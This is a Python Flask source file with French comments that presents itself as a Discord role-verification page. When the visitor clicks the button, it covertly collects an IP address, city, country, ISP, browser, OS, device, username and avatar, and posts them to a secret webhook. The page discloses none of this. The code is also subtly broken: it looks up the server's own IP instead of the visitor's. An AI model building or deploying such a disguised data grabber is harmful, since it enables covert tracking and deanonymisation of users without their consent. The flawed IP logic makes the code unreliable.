from flask import Flask, request, render_template_string
import requests
import user_agents

app = Flask(__name__)

WEBHOOK_URL = 'ton webhook' # ton webhook secret pour recevoir les info
DISCORD_API_URL = 'https://discord.com/api/v10'
BOT_TOKEN = 'token' # token du bot
GUILD_ID = 'id' # id du serveur ou il y a le role id
ROLE_ID = 'role' # role a donner apres verif
IP_INFO_URL = 'https://ipinfo.io/' # api free pour avoir des infos sur l'ip
IPIFY_URL = 'https://api.ipify.org?format=json' # api free aussi pour recup l'ipv4

def getip(): # get ip
    try:
        response = requests.get(IPIFY_URL)
        return response.json().get('ip', 'Inconnu')
    except:
        return 'Inconnu'

def gip(ip): # grab ip data
    try:
        response = requests.get(f'{IP_INFO_URL}{ip}/json')
        return response.json()
    except:
        return None

def parse_ua(ua_string):
    ua = user_agents.parse(ua_string)
    return {
        "browser": ua.browser.family,
        "os": ua.os.family,
        "device": ua.device.family
    }

def srole(discord_id): # give role
    url = f'{DISCORD_API_URL}/guilds/{GUILD_ID}/members/{discord_id}/roles/{ROLE_ID}'
    headers = {
        'Authorization': f'Bot {BOT_TOKEN}',
        'Content-Type': 'application/json'
    }
    return requests.put(url, headers=headers).status_code == 204

def gui(discord_id): # get user info
    url = f'{DISCORD_API_URL}/users/{discord_id}'
    headers = {
        'Authorization': f'Bot {BOT_TOKEN}',
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        return response.json()
    return None

@app.route('/verify')
def verify_page():
    discord_id = request.args.get('id')
    html_content = '''
    <html>
        <head>
            <link rel="stylesheet" href="/static/style.css">
        </head>
        <body>
            <h1>Vérification de rôle Discord</h1>
            <form action="/submit" method="post">
                <input type="hidden" name="discord_id" value="{{ discord_id }}">
                <button type="submit">Vérifier et obtenir le rôle</button>
            </form>
        </body>
    </html>
    '''
    return render_template_string(html_content, discord_id=discord_id)

@app.route('/submit', methods=['POST'])
def submit_form():
    discord_id = request.form.get('discord_id')
    ip = getip()
    ua = request.headers.get('User-Agent')
    ip_data = gip(ip)
    ua_info = parse_ua(ua)
    user_info = gui(discord_id)
    role_added = srole(discord_id)
    
    if role_added:
        msg = "Rôle ajouté avec succès !"
        color = 0x000000
    else:
        msg = "Échec lors de l'attribution du rôle."
        color = 0xFF0000

    embed = {
        "title": "Nouvel utilisateur vérifié",
        "description": f"L'utilisateur avec l'ID Discord {discord_id} a cliqué sur le bouton de vérification.",
        "fields": [
            {"name": "ID Discord", "value": discord_id, "inline": True},
            {"name": "Adresse IP", "value": ip, "inline": True},
            {"name": "Navigateur", "value": ua_info['browser'], "inline": True},
            {"name": "OS", "value": ua_info['os'], "inline": True},
            {"name": "Appareil", "value": ua_info['device'], "inline": True},
        ],
        "color": color
    }
    
    if ip_data:
        embed["fields"].extend([
            {"name": "Pays", "value": ip_data.get('country', 'Inconnu'), "inline": True},
            {"name": "Ville", "value": ip_data.get('city', 'Inconnu'), "inline": True},
            {"name": "Fournisseur", "value": ip_data.get('org', 'Inconnu'), "inline": True}
        ])
        
    if user_info:
        embed["thumbnail"] = {"url": f"https://cdn.discordapp.com/avatars/{discord_id}/{user_info['avatar']}.png"}
        embed["fields"].extend([
            {"name": "Pseudo", "value": user_info.get('username', 'Inconnu'), "inline": True},
            {"name": "Date de Création", "value": user_info.get('created_at', 'Inconnu'), "inline": True}
        ])
    
    requests.post(WEBHOOK_URL, json={"embeds": [embed]})

    return msg

if __name__ == '__main__':
    app.run(port=5000)
